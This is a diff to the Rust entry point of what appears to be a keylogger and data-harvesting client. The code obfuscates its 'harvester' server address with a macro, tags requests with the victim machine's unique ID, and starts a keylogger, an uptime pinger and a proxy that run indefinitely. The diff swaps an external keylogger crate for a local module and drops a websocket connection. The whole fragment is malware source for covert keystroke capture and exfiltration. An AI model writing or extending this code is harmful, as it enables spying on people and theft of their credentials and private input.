@@ -1,10 +1,9 @@
-use std::{future::pending, sync::Arc};
+use std::future::pending;
 
 use env_logger::Env;
 use log::info;
 use muddy::muddy;
 use once_cell::sync::Lazy;
-use oxalate_keylogger::spawn_keylogger;
 use reqwest::{
     Client,
     header::{HeaderMap, HeaderValue},
@@ -19,9 +18,6 @@ pub use keylogger::keylogger;
 mod proxy;
 pub use proxy::proxy;
 
-mod ws_connection;
-pub use ws_connection::WsConnection;
-
 static HARVESTER_URL: Lazy<&'static str> = Lazy::new(|| muddy!("localhost:6767"));
 static MACHINE_ID: Lazy<String> =
     Lazy::new(|| machine_uid::machine_id::get_machine_id().unwrap_or("unknown".into()));
@@ -35,7 +31,7 @@ async fn main() {
     headers.insert("machine-id", HeaderValue::from_str(&MACHINE_ID).unwrap());
     let reqwest_client = Client::builder().default_headers(headers).build().unwrap();
 
-    uptime_pinger();
+    uptime_pinger(reqwest_client.clone());
     keylogger(reqwest_client.to_owned());
 
     info!("successfully inited, running forever!");
